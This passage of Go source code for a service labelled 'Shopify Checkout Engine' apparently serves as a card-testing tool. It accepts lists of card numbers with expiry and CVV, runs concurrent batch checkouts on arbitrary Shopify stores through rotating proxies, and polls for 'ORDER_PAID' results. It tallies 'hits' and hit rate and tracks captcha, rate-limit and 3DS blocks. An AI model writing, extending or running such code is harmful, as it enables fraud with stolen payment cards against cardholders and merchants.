		} else if receiptType == "ActionRequiredReceipt" {
			res.Message = "3DS_REQUIRED"
			return res
		} else if receiptType == "FailedReceipt" {
			errCode := fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "code")
			if errCode == "" {
				errCode = fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "__typename")
			}
			if errCode == "" {
				errCode = extractCleanResponse(string(body))
			}
			if errCode == "" {
				errCode = "DECLINED_UNKNOWN"
			}
			res.Message = errCode
			return res
		}
	} else if submitType == "SubmitFailed" {
		res.Message = extractCleanResponse(fstr(body, "reason"))
		return res
	} else if submitType == "Throttled" {
		res.Message = "Throttled"
		return res
	} else if submitType == "CheckpointDenied" {
		res.Message = "CheckpointDenied"
		return res
	}

	receiptID := fstr(fastExtract(body, "receipt"), "id")
	if receiptID == "" {
		if os.Getenv("DEBUG_FALLBACK") != "0" {
			sb := string(body)
			if len(sb) > 600 {
				sb = sb[:600]
			}
			log.Printf("[DBG fallback] submitType=%s base=%s body=%.600s", submitType, baseURL, sb)
		}
		res.Message = extractCleanResponse(string(body))
		return res
	}

	// Step 7: Poll — adaptive delay (server hint first, else exponential up to 2s)
	pollPayload, _ := json.Marshal(map[string]interface{}{
		"query": QUERY_POLL, "variables": map[string]string{"receiptId": receiptID, "sessionToken": sst}, "operationName": "PollForReceipt",
	})

	lastTypename := ""
	pollDelay := POLL_INITIAL_DELAY
	for i := 0; i < MAX_POLL_ATTEMPTS; i++ {
		time.Sleep(pollDelay)
		body, status, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=PollForReceipt", headers, bytes.NewReader(pollPayload))
		if err != nil {
			time.Sleep(300 * time.Millisecond)
			body, status, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=PollForReceipt", headers, bytes.NewReader(pollPayload))
			if err != nil {
				res.Message = "POLL_TRANSPORT_ERROR"
				return res
			}
		}
		if status == 429 || status == 430 || status == 503 {
			res.Message = "RATE_LIMITED"
			return res
		}
		if isCaptchaRequired(body) {
			res.Message = "CAPTCHA_REQUIRED"
			return res
		}

		pollType := lastStr(fastExtract(body, "receipt"), "__typename")
		lastTypename = pollType
		if pollType == "ProcessedReceipt" {
			res.Success = true
			res.Message = "ORDER_PAID"
			res.Time = fmt.Sprintf("%.2fs", time.Since(cardStart).Seconds())
			return res
		} else if pollType == "FailedReceipt" {
			errCode := fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "code")
			if errCode == "" {
				errCode = fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "__typename")
			}
			if errCode == "" {
				errCode = extractCleanResponse(string(body))
			}
			if errCode == "" {
				errCode = "DECLINED_UNKNOWN"
			}
			res.Message = errCode
			return res
		} else if pollType == "ActionRequiredReceipt" {
			res.Message = "3DS_REQUIRED"
			return res
		} else if pollType == "ProcessingReceipt" || pollType == "WaitingReceipt" {
			// Adaptive delay for the NEXT iteration:
			// 1) prefer server-provided pollDelay
			// 2) else increase by POLL_STEP, capped at POLL_MAX_DELAY
			pd := fstr(fastExtract(body, "receipt"), "pollDelay")
			if n, err := strconv.Atoi(pd); err == nil && n > 0 {
				pollDelay = time.Duration(n) * time.Millisecond
				if pollDelay > POLL_MAX_DELAY {
					pollDelay = POLL_MAX_DELAY
				}
			} else {
				pollDelay += POLL_STEP
				if pollDelay > POLL_MAX_DELAY {
					pollDelay = POLL_MAX_DELAY
				}
			}
			continue
		}
	}

	if lastTypename == "ProcessingReceipt" || lastTypename == "WaitingReceipt" {
		res.Message = "STILL_PROCESSING"
	} else {
		res.Message = "STILL_PROCESSING"
	}
	res.Time = fmt.Sprintf("%.2fs", time.Since(cardStart).Seconds())
	return res
}

// ==========================================
// CONCURRENCY ENGINE
// ==========================================

type Semaphore chan struct{}

func newSemaphore(n int) Semaphore { return make(chan struct{}, n) }
func (s Semaphore) acquire()       { s <- struct{}{} }
func (s Semaphore) release()       { <-s }

var (
	globalSem = newSemaphore(GLOBAL_MAX_CONCURRENT)
	userSems  = make(map[string]Semaphore)
	mu        sync.RWMutex
)

func getUserSem(key string) Semaphore {
	mu.RLock()
	sem, ok := userSems[key]
	mu.RUnlock()
	if ok {
		return sem
	}
	mu.Lock()
	defer mu.Unlock()
	if sem, ok = userSems[key]; ok {
		return sem
	}
	sem = newSemaphore(PER_USER_CONCURRENT)
	userSems[key] = sem
	return sem
}

// ==========================================
// AUTHENTICATION
// ==========================================

func checkAuth(w http.ResponseWriter, r *http.Request) bool {
	secret := os.Getenv("API_SECRET")
	if secret == "" {
		return true
	}
	if r.URL.Query().Get("key") == secret {
		return true
	}
	if r.Header.Get("X-API-Key") == secret {
		return true
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusUnauthorized)
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"error":  "Unauthorized",
		"Status": false,
	})
	return false
}

// ==========================================
// LOGGING HELPERS
// ==========================================

func maskCard(cc string) string {
	if len(cc) >= 6 {
		return cc[:6] + "****"
	}
	if len(cc) > 0 {
		return cc + "****"
	}
	return "****"
}

// ==========================================
// HTTP HANDLERS
// ==========================================

func shopifyHandler(w http.ResponseWriter, r *http.Request) {
	if !checkAuth(w, r) {
		return
	}

	start := time.Now()
	q := r.URL.Query()
	site := q.Get("site")
	ccStr := q.Get("cc")
	proxy := q.Get("proxy")
	key := q.Get("key")
	variant := q.Get("variant")

	w.Header().Set("Content-Type", "application/json")

	if site == "" || ccStr == "" {
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"error": "Missing site or cc parameter", "Status": false})
		return
	}
	if key == "" {
		key = "default"
	}

	parts := strings.Split(ccStr, "|")
	if len(parts) != 4 {
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"error": "Invalid CC format. Use CC|MM|YYYY|CVV", "Status": false})
		return
	}

	globalSem.acquire()
	defer globalSem.release()
	uSem := getUserSem(key)
	uSem.acquire()
	defer uSem.release()

	ctx, cancel := context.WithTimeout(r.Context(), CTX_TIMEOUT)
	defer cancel()

	res := processCard(ctx, parts[0], parts[1], parts[2], parts[3], site, variant, proxy)
	if res.Time == "" {
		res.Time = fmt.Sprintf("%.2fs", time.Since(start).Seconds())
	}

	_ = json.NewEncoder(w).Encode(res)
	log.Printf("%s | %s | $%.2f %s | %s | %s", res.Message, maskCard(ccStr), res.Price, res.Currency, res.Time, res.Proxy)
}

func batchHandler(w http.ResponseWriter, r *http.Request) {
	if !checkAuth(w, r) {
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", 405)
		return
	}

	var req struct {
		Site    string   `json:"site"`
		Cards   []string `json:"cards"`
		Variant string   `json:"variant"`
		Key     string   `json:"key"`
		Proxies []string `json:"proxies"`
		Proxy   string   `json:"proxy"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid JSON"}`, 400)
		return
	}
	if req.Key == "" {
		req.Key = "default"
	}
	if len(req.Proxies) == 0 && req.Proxy != "" {
		req.Proxies = []string{req.Proxy}
	}

	ctx, cancel := context.WithTimeout(r.Context(), CTX_TIMEOUT)
	defer cancel()

	uSem := getUserSem(req.Key)

	var wg sync.WaitGroup
	results := make([]CheckoutResult, len(req.Cards))

	for i, ccStr := range req.Cards {
		wg.Add(1)
		go func(idx int, c string) {
			defer wg.Done()
			parts := strings.Split(c, "|")
			if len(parts) != 4 {
				results[idx] = CheckoutResult{CC: c, Message: "Invalid CC format", Success: false}
				return
			}

			// Acquire semaphores inside the goroutine so batch respects the same
			// global + per-user concurrency caps as /shopify.
			globalSem.acquire()
			defer globalSem.release()
			uSem.acquire()
			defer uSem.release()

			proxy := ""
			if len(req.Proxies) > 0 {
				proxy = req.Proxies[idx%len(req.Proxies)]
			}

			start := time.Now()
			res := processCard(ctx, parts[0], parts[1], parts[2], parts[3], req.Site, req.Variant, proxy)
			res.Time = fmt.Sprintf("%.2fs", time.Since(start).Seconds())
			results[idx] = res

			log.Printf("%s | %s | $%.2f %s | %s | %s", res.Message, maskCard(c), res.Price, res.Currency, res.Time, res.Proxy)
		}(i, ccStr)
	}

	wg.Wait()

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"results": results, "total_cards": len(results),
	})
}

func validateHandler(w http.ResponseWriter, r *http.Request) {
	if !checkAuth(w, r) {
		return
	}
	w.Header().Set("Content-Type", "application/json")

	site := r.URL.Query().Get("site")
	if site == "" {
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"valid": false, "error": "missing site"})
		return
	}
	baseURL := normalizeDomain(site)
	if baseURL == "" {
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"valid": false, "error": "invalid url"})
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()

	client, err := getProxyClient("")
	if err != nil {
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"valid": false, "error": "client init"})
		return
	}

	body, status, err := doReq(ctx, client, "GET", baseURL+"/products.json?limit=1", map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Accept":     "application/json",
	}, nil)
	if err != nil {
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"valid": false, "error": "unreachable"})
		return
	}

	if status == 401 || status == 403 {
		markDeadStore(baseURL, "PASSWORD_PROTECTED", 60*time.Minute)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"valid": false, "error": "password_protected"})
		return
	}

	low := strings.ToLower(string(body))
	if strings.Contains(low, "password") && strings.Contains(low, "protected") {
		markDeadStore(baseURL, "PASSWORD_PROTECTED", 60*time.Minute)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"valid": false, "error": "password_protected"})
		return
	}

	vid, price, cur, _, err := fetchVariantCached(ctx, client, baseURL)
	if err != nil {
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"valid": false, "error": "no_variant"})
		return
	}

	country := C2C[strings.ToUpper(cur)]
	if country == "" {
		country = "US"
	}

	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"valid":      true,
		"variant_id": vid,
		"price":      price,
		"currency":   cur,
		"country":    country,
	})
}

func cacheHandler(w http.ResponseWriter, r *http.Request) {
	if !checkAuth(w, r) {
		return
	}
	w.Header().Set("Content-Type", "application/json")

	action := r.URL.Query().Get("action")
	switch action {
	case "clear_variants":
		clearMap(&variantCache)
		clearMap(&tokenCache)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "cleared": "variants+tokens"})
	case "clear_dead":
		clearMap(&deadStores)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "cleared": "dead"})
	case "clear_all":
		clearMap(&variantCache)
		clearMap(&tokenCache)
		clearMap(&deadStores)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "cleared": "all"})
	case "":
		_ = json.NewEncoder(w).Encode(map[string]interface{}{
			"variant_cache_size": mapSize(&variantCache),
			"token_cache_size":   mapSize(&tokenCache),
			"dead_stores":        mapSize(&deadStores),
		})
	default:
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"error": "unknown action"})
	}
}

func formatUptime(d time.Duration) string {
	d = d.Round(time.Second)
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	if h > 0 {
		return fmt.Sprintf("%dh%dm", h, m)
	}
	if m > 0 {
		return fmt.Sprintf("%dm%ds", m, s)
	}
	return fmt.Sprintf("%ds", s)
}

func statusHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	total := atomic.LoadInt64(&metrics.TotalChecks)
	hits := atomic.LoadInt64(&metrics.TotalSuccess)
	hitRate := 0.0
	if total > 0 {
		hitRate = float64(hits) / float64(total) * 100.0
	}
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"status":                "online",
		"engine":                "Go Checkout Engine - Benchmark Edition",
		"uptime":                formatUptime(time.Since(startTime)),
		"active_checks":         atomic.LoadInt64(&metrics.ActiveChecks),
		"total_checks":          total,
		"total_hits":            hits,
		"hit_rate":              fmt.Sprintf("%.2f%%", hitRate),
		"total_failed":          atomic.LoadInt64(&metrics.TotalFailed),
		"rate_limited":          atomic.LoadInt64(&metrics.RateLimited),
		"captcha_blocked":       atomic.LoadInt64(&metrics.CaptchaBlocked),
		"3ds_count":             atomic.LoadInt64(&metrics.ThreeDSCount),
		"still_processing":      atomic.LoadInt64(&metrics.StillProcessing),
		"cart_create_fails":     atomic.LoadInt64(&metrics.CartCreateFails),
		"pci_fails":             atomic.LoadInt64(&metrics.PCIFails),
		"submit_fails":          atomic.LoadInt64(&metrics.SubmitFails),
		"cache_hits":            atomic.LoadInt64(&metrics.CacheHits),
		"cache_misses":          atomic.LoadInt64(&metrics.CacheMisses),
		"variant_cache_size":    mapSize(&variantCache),
		"dead_stores":           mapSize(&deadStores),
		"active_users":          len(userSems),
		"goroutines":            runtime.NumGoroutine(),
		"memory_alloc_mb":       float64(m.Alloc) / 1024 / 1024,
		"memory_sys_mb":         float64(m.Sys) / 1024 / 1024,
		"num_gc":                m.NumGC,
		"per_user_concurrent":   PER_USER_CONCURRENT,
		"global_max_concurrent": GLOBAL_MAX_CONCURRENT,
	})
}

func metricsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"error_codes": snapshotErrorCodes(),
	})
}

// ==========================================
// MAIN
// ==========================================

func main() {
	rand.Seed(time.Now().UnixNano())

	if os.Getenv("API_SECRET") == "" {
		log.Printf("[WARN] API_SECRET is empty — authentication disabled, all requests allowed")
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/shopify", shopifyHandler)
	mux.HandleFunc("/batch", batchHandler)
	mux.HandleFunc("/validate", validateHandler)
	mux.HandleFunc("/cache", cacheHandler)
	mux.HandleFunc("/status", statusHandler)
	mux.HandleFunc("/metrics", metricsHandler)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	})

	port := os.Getenv("PORT")
	if port == "" {
		port = PORT_DEFAULT
	}

	server := &http.Server{
		Addr:         ":" + port,
		Handler:      mux,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: CTX_TIMEOUT + 10*time.Second,
		IdleTimeout:  120 * time.Second,
	}

	log.Printf("🚀 Shopify Checkout Engine starting on port %s\n", port)
	log.Printf("⚡ Auto-Variant | SOCKS + HTTP Proxies | %d Concurrent | 1GB RAM Optimized\n", GLOBAL_MAX_CONCURRENT)
	log.Printf("[BUILD dbg-fallback-v1 fetch15s pace poll8 nocaptcha-dead]")
	log.Printf("Go runtime: %s, GOMAXPROCS=%d", runtime.Version(), runtime.GOMAXPROCS(0))

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-stop
		log.Printf("Shutdown signal received — draining in-flight checks")
		shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer shutdownCancel()
		if err := server.Shutdown(shutdownCtx); err != nil {
			log.Printf("Graceful shutdown failed: %v", err)
		}
	}()

	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Server crashed: %v", err)
	}
}
